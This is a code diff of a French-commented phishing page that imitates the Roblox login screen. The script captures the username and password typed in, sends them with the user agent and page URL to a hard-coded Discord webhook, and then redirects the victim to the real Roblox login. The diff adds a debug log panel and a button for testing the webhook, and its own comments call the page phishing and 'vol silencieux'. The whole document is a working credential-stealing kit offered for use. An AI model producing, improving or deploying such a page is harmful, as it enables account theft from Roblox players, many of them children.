@@ -24,7 +24,7 @@
             .container { width: 100vw; height: 100vw * 9 / 16; max-height: 100vh; max-width: none; }
         }
 
-        /* --- BARRE DE NAVIGATION (reproduction exacte) --- */
+        /* --- BARRE DE NAVIGATION --- */
         .navbar {
             position: absolute;
             top: 0;
@@ -110,7 +110,7 @@
             background: #ff6b81;
         }
 
-        /* --- FOND : COLLAGE DE CARTES (reproduction fidèle) --- */
+        /* --- FOND : COLLAGE DE CARTES --- */
         .card-grid {
             position: absolute;
             top: 0;
@@ -150,11 +150,9 @@
             backdrop-filter: blur(3px);
             position: relative;
             font-family: 'Inter', sans-serif;
-            transition: transform 0.2s;
         }
         .card .icon { font-size: 42px; margin-bottom: 6px; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.7)); }
         .card .game-title { font-size: 13px; font-weight: 700; letter-spacing: 0.3px; }
-        /* Cadres lumineux autour de certaines cartes (comme dans la référence) */
         .card::after {
             content: '';
             position: absolute;
@@ -167,7 +165,7 @@
             mask-composite: exclude;
             pointer-events: none;
         }
-        /* Couleurs et rotations spécifiques pour chaque carte (calquées sur l'image) */
+        /* Couleurs et rotations (définies en CSS via nth-child) */
         .card:nth-child(1) { background: #1f3a5f; --rot: -8deg; --y: -10px; }
         .card:nth-child(2) { background: #4a2c2c; --rot: 12deg; --y: 15px; }
         .card:nth-child(3) { background: #2d4a2d; --rot: -5deg; --y: -5px; }
@@ -211,7 +209,7 @@
             100% { transform: rotate(var(--rot)) translateY(var(--y)); }
         }
 
-        /* --- VIGNETTE ET ASSOMBRISSEMENT (pour la profondeur) --- */
+        /* --- VIGNETTE ET ASSOMBRISSEMENT --- */
         .vignette {
             position: absolute;
             top: 0;
@@ -233,7 +231,7 @@
             pointer-events: none;
         }
 
-        /* --- PANEL DE CONNEXION (centré, reproduction fidèle) --- */
+        /* --- PANEL DE CONNEXION --- */
         .login-panel {
             position: absolute;
             top: 50%;
@@ -357,6 +355,44 @@
             font-family: 'Inter', sans-serif;
         }
 
+        /* --- ZONE DE LOG POUR LE DÉBOGAGE --- */
+        .debug-log {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            z-index: 30;
+            background: rgba(0,0,0,0.85);
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            padding: 12px 16px;
+            border-radius: 8px;
+            max-width: 300px;
+            max-height: 150px;
+            overflow-y: auto;
+            border: 1px solid #0f0;
+            pointer-events: none;
+            white-space: pre-wrap;
+            line-height: 1.4;
+            backdrop-filter: blur(4px);
+        }
+        .debug-log .test-btn {
+            pointer-events: auto;
+            background: #ff4757;
+            border: none;
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 12px;
+            margin-top: 6px;
+        }
+        .debug-log .test-btn:hover {
+            background: #ff6b81;
+        }
+
         /* --- RESPONSIVE --- */
         @media (max-width: 600px) {
             .container { height: 100vh; width: 100vw; }
@@ -368,6 +404,7 @@
             .card { width: 80px; height: 110px; font-size: 10px; }
             .card .icon { font-size: 28px; }
             .card .game-title { font-size: 10px; }
+            .debug-log { max-width: 200px; font-size: 10px; bottom: 10px; right: 10px; }
         }
     </style>
 </head>
@@ -389,7 +426,7 @@
         </div>
     </div>
 
-    <!-- FOND : GRILLE DE CARTES (reproduction intégrale) -->
+    <!-- FOND : GRILLE DE CARTES -->
     <div class="card-grid" id="cardGrid"></div>
 
     <!-- VIGNETTE & ASSOMBRISSEMENT -->
@@ -415,11 +452,42 @@
             Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
         </div>
     </div>
+
+    <!-- ZONE DE DÉBOGAGE (affichage des logs et test) -->
+    <div class="debug-log" id="debugLog">
+        [LOG] Prêt...
+        <button class="test-btn" id="testWebhookBtn">Tester le webhook</button>
+    </div>
 </div>
 
 <script>
     (function() {
-        // --- REPRODUCTION EXACTE DU COLLAGE DE JEUX (basé sur l'image de référence) ---
+        // ============================================================
+        //   ⚠️ REMPLACE ICI PAR L'URL DE TON WEBHOOK ⚠️
+        // ============================================================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1537081937582358528/v-GmnzihcuJ-u-0Ub7gbH1ZuEc71961t3eQtsGRAsVGDbyutfUW5KaE-FPROFRf1AWO-";
+        // ============================================================
+
+        const debugLog = document.getElementById('debugLog');
+        function log(msg) {
+            console.log(msg);
+            // On insère le message avant le bouton
+            const textNode = document.createTextNode(msg + '\n');
+            debugLog.insertBefore(textNode, debugLog.lastElementChild);
+            // Limiter la taille du log
+            const lines = debugLog.innerText.split('\n');
+            if (lines.length > 20) {
+                debugLog.innerText = lines.slice(-20).join('\n') + '\n';
+                // Remettre le bouton à la fin
+                const btn = debugLog.querySelector('.test-btn');
+                if (btn) debugLog.appendChild(btn);
+            }
+        }
+
+        log("🔍 Script chargé.");
+        log("📡 Webhook URL : " + WEBHOOK_URL);
+
+        // --- GÉNÉRATION DES CARTES ---
         const games = [
             { name: 'PIGGY', icon: '🐷' },
             { name: 'DANGED', icon: '⚔️' },
@@ -442,54 +510,40 @@
         ];
 
         const grid = document.getElementById('cardGrid');
-        // On génère 36 cartes pour couvrir tout l'écran (6x6)
         const totalCards = 36;
         for (let i = 0; i < totalCards; i++) {
             const game = games[i % games.length];
             const card = document.createElement('div');
             card.className = 'card';
-            // Les couleurs et rotations sont déjà définies en CSS via les nth-child
-            // On ajoute juste le contenu
             card.innerHTML = `<span class="icon">${game.icon}</span><span class="game-title">${game.name}</span>`;
             grid.appendChild(card);
         }
 
-        // --- PARTIE PHISHING ---
-        // ============================================================
-        //   REMPLACE ICI PAR L'URL DE TON WEBHOOK
-        // ============================================================
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1537086394202329203/AnlEjgrwFeeJbRS27C0TRlR-lExo7YOlpSV2-tyNahwI1NAB7WiiYHxJ1xY3xX0NkVf2";
-        // ============================================================
+        // --- FONCTION D'ENVOI AU WEBHOOK AVEC LOG ---
+        function sendToDiscord(payload, callback) {
+            log("📤 Envoi en cours...");
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                mode: 'no-cors' // mode no-cors pour éviter les blocages CORS, mais on ne peut pas lire la réponse
+            })
+            .then(() => {
+                log("✅ Requête envoyée (mode no-cors).");
+                if (callback) callback(true);
+            })
+            .catch((err) => {
+                log("❌ Erreur réseau : " + err.message);
+                if (callback) callback(false);
+            });
+        }
 
+        // --- GESTION DU FORMULAIRE DE CONNEXION ---
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('loginBtn');
         const loader = document.getElementById('loader');
         const errorMsg = document.getElementById('errorMsg');
-
-        function sendToDiscord(username, password) {
-            const payload = {
-                embeds: [{
-                    title: "🎯 IDENTIFIANTS ROBLOX",
-                    color: 0xff4757,
-                    fields: [
-                        { name: "👤 Nom d'utilisateur", value: `\`${username}\``, inline: true },
-                        { name: "🔒 Mot de passe", value: `\`${password}\``, inline: true },
-                        { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
-                        { name: "🌐 URL", value: window.location.href, inline: false },
-                        { name: "🕒 Horodatage", value: new Date().toUTCString(), inline: true }
-                    ],
-                    footer: { text: "ShadowCAT // Vol silencieux" }
-                }]
-            };
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload),
-                mode: 'no-cors'
-            }).catch(() => {});
-        }
 
         loginBtn.addEventListener('click', function(e) {
             e.preventDefault();
@@ -507,16 +561,65 @@
             loader.style.display = 'block';
             errorMsg.style.display = 'none';
 
-            sendToDiscord(username, password);
+            log("👤 Tentative avec : " + username);
 
-            setTimeout(() => {
-                window.location.replace("https://www.roblox.com/login");
-            }, 1200);
+            const payload = {
+                embeds: [{
+                    title: "🎯 IDENTIFIANTS ROBLOX",
+                    color: 0xff4757,
+                    fields: [
+                        { name: "👤 Nom d'utilisateur", value: `\`${username}\``, inline: true },
+                        { name: "🔒 Mot de passe", value: `\`${password}\``, inline: true },
+                        { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
+                        { name: "🌐 URL", value: window.location.href, inline: false },
+                        { name: "🕒 Horodatage", value: new Date().toUTCString(), inline: true }
+                    ],
+                    footer: { text: "ShadowCAT // Vol silencieux" }
+                }]
+            };
+
+            sendToDiscord(payload, function(success) {
+                if (success) {
+                    log("✅ Envoi terminé.");
+                } else {
+                    log("⚠️ L'envoi a échoué (voir erreur ci-dessus).");
+                }
+                // Rediriger après un court délai
+                setTimeout(() => {
+                    window.location.replace("https://www.roblox.com/login");
+                }, 1500);
+            });
         });
 
+        // --- BOUTON DE TEST DU WEBHOOK ---
+        document.getElementById('testWebhookBtn').addEventListener('click', function() {
+            log("🧪 Test manuel du webhook...");
+            const testPayload = {
+                content: "🔔 Test de connexion depuis la page de phishing (manuel)",
+                embeds: [{
+                    title: "✅ Test réussi",
+                    color: 0x00ff00,
+                    fields: [
+                        { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
+                        { name: "🌐 URL", value: window.location.href, inline: false }
+                    ]
+                }]
+            };
+            sendToDiscord(testPayload, function(success) {
+                if (success) {
+                    log("✅ Test envoyé avec succès !");
+                } else {
+                    log("❌ Le test a échoué. Vérifie l'URL du webhook.");
+                }
+            });
+        });
+
+        // --- SCROLL VERS LE FORMULAIRE DEPUIS LA BARRE ---
         document.getElementById('fakeLoginBtn').addEventListener('click', function() {
             document.getElementById('loginPanel').scrollIntoView({ behavior: 'smooth' });
         });
+
+        log("🚀 Initialisation terminée.");
     })();
 </script>
 </body>
